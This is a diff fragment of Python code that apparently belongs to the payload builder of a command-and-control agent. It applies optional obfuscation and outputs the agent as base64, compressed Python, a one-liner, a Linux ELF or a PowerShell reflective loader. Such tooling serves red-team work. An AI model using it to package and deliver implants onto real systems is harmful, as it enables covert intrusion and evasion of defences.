+            elif obfuscation_level == "basic":
+                base_code = basic_obfuscate(base_code)
+                await self.update_build_step("Applying Obfuscation", "Basic obfuscation applied successfully")
+            else:  # none
+                await self.update_build_step("Applying Obfuscation", "No obfuscation requested, skipping")
+            
+            # Step 5: Finalize payload format
+            await self.update_build_step("Finalizing Payload", "Preparing output in requested format...")
+            
+            output_format = self.get_parameter("output")
+
+            if output_format == "base64":
+                resp.payload = base64.b64encode(base_code.encode())
+                resp.build_message = "Successfully built payload in base64 format"
+
+            elif output_format == "py_compressed":
+                compressed_code = compress_code(base_code)
+                resp.payload = compressed_code.encode()
+                resp.build_message = "Successfully built compressed Python payload"
+
+            elif output_format == "one_liner":
+                one_liner = create_one_liner(base_code)
+                resp.payload = one_liner.encode()
+                resp.build_message = "Successfully built one-liner payload"
+
+            elif output_format == "elf_linux":
+                try:
+                    await self.update_build_step("Finalizing Payload", "Building Linux executable...")
+                    executable_data = self._build_executable(base_code, "linux")
+                    resp.payload = executable_data
+                    resp.updated_filename = (self.filename).split(".")[0] +".elf"
+                    resp.build_message = "Successfully built Linux executable"
+                except Exception as e:
+                    resp.set_status(BuildStatus.Error)
+                    resp.build_stderr = f"Failed to build Linux executable: {str(e)} * {self.filename} * {output_format}"
+                    return resp
+                
+            elif output_format == "powershell_reflective":
+                try:
+                    await self.update_build_step("Finalizing Payload", "Creating PowerShell reflective loader...")
+                    ps_loader = self._create_powershell_loader(base_code)
+                    resp.payload = ps_loader.encode()
+                    resp.updated_filename = (self.filename).split(".")[0] +".ps1"
+                    resp.build_message = "Successfully built PowerShell reflective loader"
+                except Exception as e:
+                    resp.set_status(BuildStatus.Error)
+                    resp.build_stderr = f"Failed to build PowerShell loader: {str(e)}"
+                    return resp
+                
+            else:  # default to py
+                resp.payload = base_code.encode()
+                resp.build_message = "Successfully built Python script payload"
+            
+            # Report any non-fatal errors
             if build_errors:
                 resp.build_stderr = "Warnings during build:\n" + "\n".join(build_errors)
-            logger.info("Payload build completed successfully")
+            
+
         except Exception as e:
+            self.logger.error(f"Build failed: {str(e)}")
             resp.set_status(BuildStatus.Error)
             resp.build_stderr = f"Error building payload: {str(e)}"
-            logger.error(f"Payload build failed: {str(e)}")
+            await self.update_build_step("Finalizing Payload", f"Build failed: {str(e)}", False)
+            
         return resp
